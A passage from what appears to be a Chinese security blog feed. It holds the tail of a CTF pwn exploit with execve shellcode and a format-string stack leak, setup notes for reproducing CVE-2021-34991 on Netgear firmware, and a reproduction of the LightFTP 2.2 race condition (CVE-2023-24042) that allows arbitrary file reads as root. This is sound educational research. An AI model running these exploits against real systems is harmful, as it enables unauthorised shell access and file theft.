class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fmt = <span class="string">b&quot;%8$p&quot;</span></span><br><span class="line">sla(<span class="string">b&quot;hello,What do you want to ask?&quot;</span>,fmt)</span><br><span class="line">p.recvline()</span><br><span class="line">stack = int16(r(<span class="number">14</span>)) - <span class="number">0x90</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;ok,&quot;</span>)</span><br><span class="line">num = <span class="built_in">int</span>(r(<span class="number">3</span>),<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;++++++++--&gt;&quot;</span>,num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xd2\x48\x31\xf6\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#31</span></span><br><span class="line">payload = shellcode</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(stack)</span><br><span class="line">sa(<span class="string">b&quot;luck number&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-34991</title>
    <url>/2025/08/08/CVE-2021-34991%20%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>CVE-2021-34991漏洞可以在Netgear SOHO个别设备中获取root权限，进行远程代码执行。该漏洞发生于upnp服务程序中没有严格检查字符串拷贝的长度，导致可以栈溢出控制程序的执行流。</p>
<p>本次复现所采用的固件版本为R6400v2-1.0.4.118，可点击<a href="https://www.netgear.com/support/download/?model=R6400v2">这里</a>进行下载。</p>
<p>安装<code>binwalk</code>这里安装的旧版本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ReFirmLabs/binwalk.git binwalk</span><br><span class="line"><span class="built_in">cd</span> binwalk</span><br><span class="line">git checkout v2.3.3</span><br><span class="line"><span class="built_in">sudo</span> ./deps.sh</span><br><span class="line"><span class="built_in">sudo</span> python3 setup.py install</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/z306417888/article/details/129542930">binwalk使用说明</a></p>
<p><a href="https://toleleyjl.github.io/2023/02/15/FirmAE%E5%88%9D%E6%AD%A5%E4%BD%BF%E7%94%A8/">自动化固件模拟</a></p>
<p>upnp服务程序查找命令<code>find ~/cve/cve-2021-34991/core/squashfs-root -name &quot;upnpd&quot;</code></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>arm</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2023-24042复现</title>
    <url>/2025/08/04/FTP%E5%8D%8F%E8%AE%AE%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h1 id="FTP协议介绍"><a href="#FTP协议介绍" class="headerlink" title="FTP协议介绍"></a>FTP协议介绍</h1><h2 id="FTP简介"><a href="#FTP简介" class="headerlink" title="FTP简介"></a>FTP简介</h2><p>FTP协议：是TCP&#x2F;IP协议组中的协议之一。FTP协议包括两个组成，其一为FTP服务器，其二为FTP客户端。其中FTP服务器用来存储文件，用户可以使用FTP客户端通过FTP协议访问位于FTP服务器上的资源。</p>
<p><img data-src="/../images/image-20250805110034180.png" alt="image-20250805110034180"></p>
<h2 id="FTP工作原理"><a href="#FTP工作原理" class="headerlink" title="FTP工作原理"></a><strong>FTP工作原理</strong></h2><p><strong>FTP的核心工作原理：双连接模式</strong></p>
<p>FTP作为一个应用层协议，其独特之处在于它使用两个独立的TCP连接来完成文件传输任务：</p>
<ul>
<li><strong>控制连接（Control Connection）</strong>：这是整个FTP会话期间一直保持连接的通道。 它用于在客户端和服务器之间传输命令和服务器的响应信息。</li>
<li><strong>数据连接（Data Connection）</strong>：这是一个临时的连接，仅在需要传输文件数据（如上传、下载文件或获取目录列表）时创建。</li>
</ul>
<p><img data-src="/../images/image-20250805110141283.png" alt="image-20250805110141283"></p>
<p>图示工作成功流程：</p>
<p>这张图展示的是建立<strong>控制连接</strong>并完成用户身份验证的步骤。</p>
<ol>
<li><p><strong>建立连接 (Connecting Port 21)</strong></p>
<ul>
<li>客户端首先向FTP服务器的<strong>21号端口</strong>发起连接请求，这个端口是专门用于FTP控制连接的。</li>
</ul>
</li>
<li><p><strong>服务器就绪响应 (220 FTP Server v1.0)</strong></p>
<ul>
<li>服务器接收到连接请求后，会返回一个以”220”开头的响应码。这表示服务器已经准备就绪，可以接受客户端的命令了。图中的 “220 FTP Server v1.0” 明确地告知客户端，对方是一个1.0版本的FTP服务器。</li>
</ul>
</li>
<li><p><strong>客户端发送用户名 (USER <username>)</strong></p>
<ul>
<li>客户端接收到服务器的就绪信息后，会发送<code>USER</code>命令，后面跟着用户的登录名（图中示例为<code>myname</code>）。</li>
</ul>
</li>
<li><p><strong>服务器要求输入密码 (331 USER command OK, password required)</strong></p>
<ul>
<li>服务器收到用户名后，如果该用户存在，会返回一个”331”的响应码。这个响应码的含义是“用户名正确，需要输入密码”。</li>
</ul>
</li>
<li><p><strong>客户端发送密码 (PASS <password>)</strong></p>
<ul>
<li>客户端接着发送<code>PASS</code>命令，后面附上用户的密码（图中示例为<code>mypass</code>）。</li>
</ul>
</li>
<li><p><strong>登录成功 (230 User logged in success)</strong></p>
<ul>
<li>服务器验证密码无误后，会返回”230”响应码，表示用户已成功登录。 此时，控制连接上的身份验证过程全部完成，客户端就可以开始发送其他命令，如请求文件列表、上传或下载文件了。</li>
</ul>
</li>
</ol>
<p><img data-src="/../images/image-20250805111653939.png" alt="image-20250805111653939"></p>
<p>这张图的核心信息是：<strong>FTP协议是通过在TCP连接上发送明文命令来进行交互的。</strong></p>
<p>我们来分层解读这张截图中的信息：</p>
<ol>
<li><strong>顶层文字描述</strong>:<ul>
<li>“<strong>通信数据包：</strong>” - 标题，说明了图片内容。</li>
<li>“<strong>FTP 是基于 TCP&#x2F;IP 协议实现的，通过拦截数据包可以得知，其通过发送特定命令字进行交互</strong>” - 这句话是核心概括。它点明了：<ul>
<li><strong>基础协议</strong>: FTP 运行在可靠的 TCP&#x2F;IP 协议之上。</li>
<li><strong>工作方式</strong>: FTP 客户端和服务器之间是通过发送特定的命令（如 USER, PASS, LIST 等）和接收响应来进行通信的。</li>
<li><strong>可被“看”到</strong>: 因为命令是明文的，所以用抓包工具可以直接看到通信内容。</li>
</ul>
</li>
</ul>
</li>
<li><strong>TCP 协议层信息</strong>:<ul>
<li>截图中间部分展示了这是个TCP数据包。</li>
<li><strong>TCP payload (16 bytes)</strong>: 这表示TCP数据段中承载的应用层数据（也就是FTP命令）大小为16个字节。</li>
</ul>
</li>
<li><strong>FTP 协议层信息 (重点)</strong>:<ul>
<li><strong>File Transfer Protocol (FTP)</strong>: 抓包工具已经智能地识别出TCP包里装的是FTP协议的数据。</li>
<li><strong>被红色圆圈圈出的部分是关键</strong>:<ul>
<li><strong>Request command: USER</strong>: 这清晰地表明，这个数据包里包含的是一个FTP的 USER 命令。这个命令用于向服务器指定用户名。</li>
<li><strong>Request arg: anonymous</strong>: 这是 USER 命令的参数，即用户名是 “anonymous”（匿名）。这说明客户端正在尝试进行一次匿名FTP登录。</li>
<li><strong>USER anonymous\r\n</strong>: 这是在网络中传输的原始命令字符串。\r\n 是回车和换行的组合，在FTP协议中用来标记一行命令的结束。</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>**主动模式：**服务器主动连接主机传输文件</p>
<p>**被动模式：**服务器开放指定端口，主机向其发起连接</p>
<p><img data-src="/../images/image-20250805185607121.png" alt="image-20250805185607121"></p>
<h2 id="FTP常用命令字"><a href="#FTP常用命令字" class="headerlink" title="FTP常用命令字"></a>FTP常用命令字</h2><ul>
<li>ABOR - 放弃先前的FTP命令和数据传输</li>
<li>LIST - 列表显示文件或目录</li>
<li>PASS - 服务器上的密码</li>
<li>QUIT - 从服务器退出</li>
<li>RETR - 检索（取）一个文件</li>
<li>STOR - 存储（放）一个文件</li>
<li>SYST - 服务器返回系统类型</li>
<li>USER - 服务器上用户名</li>
</ul>
<p><strong>RETR命令字</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// RETR 命令字:</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ftpRETR</span><span class="params">(PFTPCONTEXT context, <span class="type">const</span> <span class="type">char</span> *params)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ... (省略了变量定义)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查用户是否已登录</span></span><br><span class="line">    <span class="keyword">if</span> (context-&gt;Access == FTP_ACCESS_NOT_LOGGED_IN)</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error530); <span class="comment">// 如果未登录，返回错误530</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建文件的完整有效路径</span></span><br><span class="line">    ftp_effective_path(context-&gt;RootDir, context-&gt;CurrentDir, params, <span class="keyword">sizeof</span>(context-&gt;FileName), context-&gt;FileName);<span class="comment">//因为一般服务器上ftp协议只能访问指定文件夹</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环（虽然用while，但逻辑上类似if，只要文件存在就执行一次）</span></span><br><span class="line">    <span class="keyword">while</span> (stat(context-&gt;FileName, &amp;filestats) == <span class="number">0</span>) <span class="comment">// 获取文件状态，如果文件存在</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 如果请求的是一个目录，则退出</span></span><br><span class="line">        <span class="keyword">if</span> (S_ISDIR(filestats.st_mode))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向客户端发送 &quot;150&quot; 状态码，表示准备开始传输</span></span><br><span class="line">        sendstring(context, interm150);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 记录日志</span></span><br><span class="line">        writelogentry(context, <span class="string">&quot;RETR: &quot;</span>, (<span class="type">char</span> *)params);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个新的工作线程来处理实际的文件传输</span></span><br><span class="line">        context-&gt;WorkerThreadValid = pthread_create(&amp;tid, <span class="literal">NULL</span>, (<span class="type">void</span> * (*)(<span class="type">void</span> *))retr_thread, context);<span class="comment">//这里做对应的传输</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="FTP协议实战"><a href="#FTP协议实战" class="headerlink" title="FTP协议实战"></a>FTP协议实战</h1><h2 id="初步配置"><a href="#初步配置" class="headerlink" title="初步配置"></a>初步配置</h2><p>从官方下载源代码这里使用的是<a href="https://github.com/hfiref0x/LightFTP/releases">lightftp-2.2</a></p>
<p>我们要调试源代码解压后进入Source的debug里面，执行<code>make</code>后目录如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:Debug/ $ <span class="built_in">ls</span></span><br><span class="line">cfgparse.d  fftp           fspathtools.o  ftpconst.o  ftpserv.o  main.o    objects.mk  subdir.mk   x_malloc.o</span><br><span class="line">cfgparse.o  fspathtools.d  ftpconst.d     ftpserv.d   main.d     makefile  sources.mk  x_malloc.d</span><br></pre></td></tr></table></figure>

<p>将这个<code>fftp</code>程序复制下来放到lightftp目录的bin目录下</p>
<p>在bin目录下有一个<code>fftp.conf</code>这个是ftp服务器的配置文件，在bin目录里面创建一个<code>logfile</code>用<code>touch logfile</code>，修改配置文件中<code>logfilepath=/home/user/fftplog</code>为创建的这个logfile的路径如<code>/home/le0n/study/ftp/LightFTP-2.2/Bin/logfile</code></p>
<p>创建一个<code>ftpshare</code>最后的代码改为如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[anonymous]</span><br><span class="line">pswd=*</span><br><span class="line">accs=<span class="built_in">readonly</span></span><br><span class="line">root=/home/le0n/study/ftp/LightFTP-2.2/Bin/ftpshare</span><br><span class="line"></span><br><span class="line">[uploader]</span><br><span class="line">pswd=Weakuploaderpassword111</span><br><span class="line">accs=upload</span><br><span class="line">root=/home/le0n/study/ftp/LightFTP-2.2/Bin/ftpshare</span><br><span class="line"></span><br><span class="line">[webadmin]</span><br><span class="line">pswd=VeryStrongadminpassword222</span><br><span class="line">accs=admin</span><br><span class="line">root=/home/le0n/study/ftp/LightFTP-2.2/Bin/ftpshare</span><br></pre></td></tr></table></figure>

<p>在ftpshare中创建一个demo文件，并写入一段字，如<code>testfile</code></p>
<h2 id="启动服务器"><a href="#启动服务器" class="headerlink" title="启动服务器"></a>启动服务器</h2><p>完成前面的操作后就可以启动ftp服务器了，在bin目录下执行</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./fftp</span><br></pre></td></tr></table></figure>

<p>运行后出现如下就相当于启动起来了</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:Bin/ $ <span class="built_in">sudo</span> ./fftp                                                                                                    [20:18:32]</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> le0n:</span><br><span class="line"></span><br><span class="line">    [ LightFTP server v2.2 ]</span><br><span class="line"></span><br><span class="line">Log file        : /home/le0n/study/ftp/LightFTP-2.2/Bin/logfile</span><br><span class="line">Working <span class="built_in">dir</span>     : /home/le0n/study/ftp/LightFTP-2.2/Bin</span><br><span class="line">Config file     : /home/le0n/study/ftp/LightFTP-2.2/Bin/fftp.conf</span><br><span class="line">Interface ipv4  : 0.0.0.0</span><br><span class="line">Interface mask  : 255.255.255.0</span><br><span class="line">External ipv4   : 123.45.67.89</span><br><span class="line">Port            : 21</span><br><span class="line">Max <span class="built_in">users</span>       : 10</span><br><span class="line">PASV port range : 1024..65535</span><br><span class="line"></span><br><span class="line"> TYPE q or Ctrl+C to terminate &gt;</span><br><span class="line">05-08-2025 20:18:40 : 220 LightFTP server ready</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后新开一个终端连接ftp，执行<code>ftp 0.0.0.0</code></p>
<p>这里的用户名是配置文件中的<code>anonymous</code>，密码是<code>*</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">le0n:~/ $ ftp 0.0.0.0   </span><br><span class="line">Connected to 0.0.0.0.</span><br><span class="line">220 LightFTP server ready</span><br><span class="line">Name (0.0.0.0:le0n): anonymous</span><br><span class="line">331 User anonymous OK. Password required</span><br><span class="line">Password:</span><br><span class="line">230 User logged <span class="keyword">in</span>, proceed.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt;</span><br></pre></td></tr></table></figure>

<p>在对应的控制台也可以看到日志用户登陆了</p>
<p>执行<code>ls</code>既可以看到我们放在<code>ftpshare</code>中（ftp的根目录）的文件demo</p>
<p><code>help</code>就可以看到我们可以使用的命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ftp&gt; <span class="built_in">help</span></span><br><span class="line">Commands may be abbreviated.  Commands are:</span><br><span class="line"></span><br><span class="line">!               cr              ftp             macdef          msend           prompt          restart         sunique</span><br><span class="line">$               debug           gate            mdelete         newer           proxy           rhelp           system</span><br><span class="line">account         delete          get             mdir            nlist           put             <span class="built_in">rmdir</span>           tenex</span><br><span class="line">append          <span class="built_in">dir</span>             glob            mget            nmap            <span class="built_in">pwd</span>             rstatus         throttle</span><br><span class="line">ascii           disconnect      <span class="built_in">hash</span>            <span class="built_in">mkdir</span>           ntrans          quit            runique         trace</span><br><span class="line">bell            edit            <span class="built_in">help</span>            mls             open            quote           send            <span class="built_in">type</span></span><br><span class="line">binary          epsv            idle            mlsd            page            rate            sendport        <span class="built_in">umask</span></span><br><span class="line"><span class="built_in">bye</span>             epsv4           image           mlst            passive         rcvbuf          <span class="built_in">set</span>             <span class="built_in">unset</span></span><br><span class="line"><span class="keyword">case</span>            epsv6           lcd             mode            pdir            recv            site            usage</span><br><span class="line"><span class="built_in">cd</span>              <span class="built_in">exit</span>            less            modtime         pls             reget           size            user</span><br><span class="line">cdup            features        lpage           more            pmlsd           remopts         sndbuf          verbose</span><br><span class="line"><span class="built_in">chmod</span>           fget            lpwd            mput            preserve        rename          status          xferbuf</span><br><span class="line">close           form            <span class="built_in">ls</span>              mreget          progress        reset           struct          ?</span><br><span class="line">ftp&gt;</span><br></pre></td></tr></table></figure>

<p>执行<code>get demo</code>就可以下载这个demo文件了</p>
<p>到这里环境搭建和测试基本完成</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里是一个条件竞争漏洞导致了路径穿越，可以下载</p>
<h3 id="漏洞链"><a href="#漏洞链" class="headerlink" title="漏洞链"></a>漏洞链</h3><p>具体位置位于ftplight-2.2的源码的<code>ftpserv.c</code>的750行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ftpRETR() --&gt; retrthread() --&gt; create_datasocket() --&gt; swith语句等待接收 --&gt; 在ftpRETR中的循环并没有结束，思考context是否能够改写</span><br></pre></td></tr></table></figure>

<p>具体原因：ftpUSER()中的snprintf()，在程序阻塞时可以再次修改filename并没有任何检查可以下载符合路径的文件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义处理FTP RETR命令的函数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ftpRETR</span><span class="params">(PFTPCONTEXT context, <span class="type">const</span> <span class="type">char</span> *params)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">stat</span>	<span class="title">filestats</span>;</span> <span class="comment">// 用于存储文件信息的结构体</span></span><br><span class="line">    <span class="type">pthread_t</span>		tid; <span class="comment">// 线程ID</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查用户是否已登录，如果未登录则发送530错误（未登录）</span></span><br><span class="line">    <span class="keyword">if</span> (context-&gt;Access == FTP_ACCESS_NOT_LOGGED_IN)</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error530);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查工作线程是否有效，如果无效则发送550_t错误（可能是临时性错误）</span></span><br><span class="line">    <span class="keyword">if</span> (context-&gt;WorkerThreadValid == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, <span class="type">error550_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否提供了文件名参数，如果没有则发送501错误（参数语法错误）</span></span><br><span class="line">    <span class="keyword">if</span> ( params == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error501);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果之前有打开的文件，先关闭它</span></span><br><span class="line">    <span class="keyword">if</span> ( context-&gt;File != <span class="number">-1</span> ) &#123;</span><br><span class="line">        close(context-&gt;File);</span><br><span class="line">        context-&gt;File = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建文件的绝对路径————规范用户输入的路径为ftp服务器的根目录路径</span></span><br><span class="line">    ftp_effective_path(context-&gt;RootDir, context-&gt;CurrentDir, params, <span class="keyword">sizeof</span>(context-&gt;FileName), context-&gt;FileName);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环检查文件状态————确认文件是不是合法的</span></span><br><span class="line">    <span class="keyword">while</span> (stat(context-&gt;FileName, &amp;filestats) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 如果是目录，则跳出循环</span></span><br><span class="line">        <span class="keyword">if</span> ( S_ISDIR(filestats.st_mode) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送150状态码，表示文件状态正常，即将打开数据连接 [15, 32]</span></span><br><span class="line">        sendstring(context, interm150);</span><br><span class="line">        <span class="comment">// 将RETR操作写入日志</span></span><br><span class="line">        writelogentry(context, <span class="string">&quot; RETR: &quot;</span>, (<span class="type">char</span> *)params);</span><br><span class="line">        <span class="comment">// 重置工作线程中止标志</span></span><br><span class="line">        context-&gt;WorkerThreadAbort = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 锁定互斥锁，以保护共享的上下文数据</span></span><br><span class="line">        pthread_mutex_lock(&amp;context-&gt;MTLock);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个新的线程来处理文件下载（retr_thread函数）[1, 2, 4, 5, 7]</span></span><br><span class="line">        context-&gt;WorkerThreadValid = pthread_create(&amp;tid, <span class="literal">NULL</span>, (<span class="type">void</span> * (*)(<span class="type">void</span> *))retr_thread, context);</span><br><span class="line">        <span class="comment">//这里就是把context参数传入retr_thread()</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">return</span> sendstring(context, error550);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟踪进入retr_thread()函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">retr_thread</span><span class="params">(PFTPCONTEXT context)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...一些锁和变量</span></span><br><span class="line">    buffer = <span class="built_in">malloc</span>(TRANSMIT_BUFFER_SIZE);<span class="comment">//malloc一个缓冲区</span></span><br><span class="line">    <span class="keyword">while</span> (buffer != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        clientsocket = create_datasocket(context);<span class="comment">//注意这里create_datasocket()</span></span><br><span class="line">        <span class="keyword">if</span> (clientsocket == INVALID_SOCKET)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<p>跟进create_datasocket()函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SOCKET <span class="title function_">create_datasocket</span><span class="params">(PFTPCONTEXT context)</span></span><br><span class="line">&#123;</span><br><span class="line">    SOCKET				clientsocket = INVALID_SOCKET;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span>	<span class="title">laddr</span>;</span></span><br><span class="line">    <span class="type">socklen_t</span>			asz;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;laddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(laddr));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> ( context-&gt;Mode ) &#123;<span class="comment">//switch去判断当前context的模式</span></span><br><span class="line">    <span class="keyword">case</span> MODE_NORMAL:<span class="comment">//主动模式</span></span><br><span class="line">        clientsocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);<span class="comment">//创建套接字</span></span><br><span class="line">        context-&gt;DataSocket = clientsocket;</span><br><span class="line">        <span class="keyword">if</span> ( clientsocket == INVALID_SOCKET )</span><br><span class="line">            <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line"></span><br><span class="line">        laddr.sin_family = AF_INET;</span><br><span class="line">        laddr.sin_port = context-&gt;DataPort;</span><br><span class="line">        laddr.sin_addr.s_addr = context-&gt;DataIPv4;</span><br><span class="line">        <span class="keyword">if</span> ( connect(clientsocket, (<span class="type">const</span> <span class="keyword">struct</span> sockaddr *)&amp;laddr, <span class="keyword">sizeof</span>(laddr)) == <span class="number">-1</span> ) &#123;</span><br><span class="line">            <span class="comment">//主动连接用户主机</span></span><br><span class="line">            close(clientsocket);</span><br><span class="line">            <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> MODE_PASSIVE:<span class="comment">//被动模式</span></span><br><span class="line">        asz = <span class="keyword">sizeof</span>(laddr);</span><br><span class="line">        clientsocket = accept(context-&gt;DataSocket, (<span class="keyword">struct</span> sockaddr *)&amp;laddr, &amp;asz);</span><br><span class="line">            <span class="comment">//这里的accept()等待用户的连接</span></span><br><span class="line">        close(context-&gt;DataSocket);</span><br><span class="line">        context-&gt;DataSocket = clientsocket;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( clientsocket == INVALID_SOCKET )</span><br><span class="line">            <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line"></span><br><span class="line">        context-&gt;DataIPv4 = <span class="number">0</span>;</span><br><span class="line">        context-&gt;DataPort = <span class="number">0</span>;</span><br><span class="line">        context-&gt;Mode = MODE_NORMAL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clientsocket;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么这里在等待用户连接时，它原来的进程会阻塞直到用户的连接到来为止。</p>
<p>回到retr_thread()函数中672行左右</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">f = open(context-&gt;FileName, O_RDONLY);</span><br><span class="line">      context-&gt;File = f;</span><br><span class="line">      <span class="keyword">if</span> (f == <span class="number">-1</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>这里在前面create_datasocket()执行过后open()了<code>context-&gt;Filename</code>，那我们可以思考一下这个context能否被改写，在同一个用户的连接过程中若能够改写这里的context的Filename，那他就不会是前面<code>ftp_effective_path()</code>规整过的路径。</p>
<p><strong>导致的具体原因来自ftpUSER()函数</strong>，在253行左右</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ftpUSER</span><span class="params">(PFTPCONTEXT context, <span class="type">const</span> <span class="type">char</span> *params)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( params == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error501);</span><br><span class="line"></span><br><span class="line">    context-&gt;Access = FTP_ACCESS_NOT_LOGGED_IN;</span><br><span class="line"></span><br><span class="line">    writelogentry(context, <span class="string">&quot; USER: &quot;</span>, (<span class="type">char</span> *)params);</span><br><span class="line">    <span class="built_in">snprintf</span>(context-&gt;FileName, <span class="keyword">sizeof</span>(context-&gt;FileName), <span class="string">&quot;331 User %s OK. Password required\r\n&quot;</span>, params);<span class="comment">//这里可以改写context-&gt;filename</span></span><br><span class="line">    sendstring(context, context-&gt;FileName);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Save login name to FileName for the next PASS command */</span></span><br><span class="line">    <span class="built_in">strcpy</span>(context-&gt;FileName, params);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>若RETR线程里面while()仍在循环且位于阻塞时（即等待用户连接），我们通过ftpUSER的snprintf来改变这个<code>context-&gt;Filename</code>再回到循环中就会执行open()函数，使得只要这个filename合法（可以找到）就可以取任意的下载文件</p>
<p><strong>因为ftp是通过21端口交流的，这个端口需要有root权限，所以这个open()也是root权限以至于我们能够下载任意文件</strong></p>
<h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><p>在root模式下用gdb调试一下这个完整的登录流程</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gdb ./fftp</span><br></pre></td></tr></table></figure>

<p>给我们想要观察的函数下断点（这里可能在gdb中调试着客户端那边就断开连接，可以一次断一个观察）</p>
<ul>
<li><code>b ftpUSER</code></li>
<li><code>b ftpPASS</code></li>
<li><code>b ftpRETR</code></li>
</ul>
<p>然后执行<code>r</code>运行这个程序，新建一个终端使用ftp去登陆它</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ftp 0.0.0.0</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在这里跟进后找到了为什么总是断开连接的原因？</p>
<p>因为我的ftp服务端开的被动模式。</p>
<p>如何调整，直接在客户端执行passive即可（且每一次建立会话时都默认被动模式）</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt;root:Bin/ <span class="comment"># ftp </span></span><br><span class="line">&gt;ftp&gt; passive</span><br><span class="line">&gt;Passive mode: off; fallback to active mode: off.</span><br></pre></td></tr></table></figure></blockquote>
<p>在ftp连接后且登录上，执行这个<code>passive或PASV</code>，切换为主动模式</p>
<p>注：在调试过程中可能会有exp运行后在gdb中并没有出现调试界面，稍等一会重新操作即可</p>
